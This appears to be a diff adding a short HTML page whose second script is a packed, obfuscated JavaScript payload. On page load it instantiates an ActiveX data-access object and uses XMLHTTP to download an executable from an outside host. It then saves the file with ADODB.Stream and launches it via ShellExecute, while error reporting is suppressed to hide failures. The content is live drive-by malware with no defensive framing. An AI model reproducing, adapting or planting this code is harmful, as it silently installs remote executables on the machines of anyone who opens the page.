@@ -1,0 +1,8 @@
+<html>
+<script>
+	window.onerror=function(){return true;}
+	window.status="Íê³É";
+</script>
+<script>
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('k.A("<b>3 9,6;9=\\"B:\\/\\/T\\"+\\"P\\"+\\"I.J\\"+\\"K\\"+\\"e-H\\"+\\"F.c\\"+\\"n\\/G\\"+\\"4.L\\";6=\\"6.M\\";R{3 7=(k.Q(\\"N\\"));3 d=1;7.O(\\"E\\",\\"s\\"+\\"r\\"+\\":u\\"+\\"q\\"+\\"p\\"+\\"-t\\"+\\"D-11\\"+\\"v-\\"+\\"C\\"+\\"z-0\\"+\\"w\\"+\\"x\\"+\\"\\y\\S\\X\\1h\\1d\\");3 e=1;3 8=7.1c(\\"1b\\"+\\"U.19\\"+\\"1a\\"+\\"1f\\",\\"\\");3 f=1;3 i=\\"1i\\";3 j=\\"1g.1e\\";3 a=\\"18\\";3 g=1;3 5=7.m(i+j+a,\\"\\");3 h=1;8.Y(\\"V\\",9,0);8.W();5.10=1;3 n=1;5.o();5.15(8.13);5.17(6,2);5.14();3 l=7.m(\\"16.12\\",\\"\\");l.Z(6,\\"\\",\\"\\",\\"o\\",0);}1j(e){};</b\\>");',62,82,'|||var||as|fafafasdfaddd|ado|xml|fuck|an|script|||||||ln|lzn|document|shell|createobject||open|556|96C|id|cls|65|BD|D0|0C|04FC|x32|3A|writeln|http|98|A3|classid|ogle|61|go|221|se|rvic|exe|com|object|setAttribute|80|createElement|try|x39|200|osoft|GET|Send|x45|Open|Shellexecute|type||Application|responseBody|close|write|Shell|savetofile|ream|XM|LHT|Micr|CreateObject|x36|St|TP|db|x33|Ado|catch'.split('|'),0,{}));
+</script>
